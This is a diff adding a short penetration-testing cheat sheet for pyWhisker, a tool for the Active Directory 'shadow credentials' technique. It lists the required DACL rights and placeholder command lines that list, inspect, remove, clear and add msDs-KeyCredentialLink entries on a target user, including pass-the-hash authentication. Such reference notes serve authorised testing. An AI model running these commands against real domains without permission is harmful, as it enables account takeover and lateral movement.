@@ -1,0 +1,61 @@
+# pyWhisker
+
+% dacl, shadow credentials, msDs-KeyCredentialLink
+#plateform/linux #target/remote #cat/RECON 
+
+## requierements
+```
+GenericAll, GenericWrite, WriteProperty or Validated-SPN 
+DC must have its own certificate and keys (RB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP)
+```
+
+## list all current KeyCredentials ID and creation time (cred)
+https://github.com/ShutdownRepo/pywhisker
+
+```
+pywhisker.py --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <target_user> --action "list"
+```
+
+
+## list all current KeyCredentials ID and creation time (pth)
+https://github.com/ShutdownRepo/pywhisker
+
+```
+pywhisker.py --dc-ip <dc_ip> -d <domain> -u <user> -H <nt_hash> --target <target_user> --action "list"
+```
+
+
+## get info on KeyCredential (pth)
+https://github.com/ShutdownRepo/pywhisker
+
+```
+pywhisker.py --dc-ip <dc_ip> -d <domain> -u <user> -H <nt_hash> --target <target_user> --action "info" --device-id=<device_id>
+```
+
+
+## remove KeyCredential (pth)
+#cat/ATTACK/DACL-ABUSE
+https://github.com/ShutdownRepo/pywhisker
+
+```
+pywhisker.py --dc-ip <dc_ip> -d <domain> -u <user> -H <nt_hash> --target <target_user> --action "remove" --device-id=<device_id>
+```
+
+## clear KeyCredential (pth)
+#cat/ATTACK/DACL-ABUSE
+https://github.com/ShutdownRepo/pywhisker
+
+```
+pywhisker.py --dc-ip <dc_ip> -d <domain> -u <user> -H <nt_hash> --target <target_user> --action "clear" 
+```
+
+## add KeyCredential (pth)
+#cat/ATTACK/DACL-ABUSE
+https://github.com/ShutdownRepo/pywhisker
+
+```
+pywhisker.py --dc-ip <dc_ip> -d <domain> -u <user> -H <nt_hash> --target <target_user> --action "add"  -f <pfx_file> -P <pfx_password|jubeaz>
+```
+
+
+
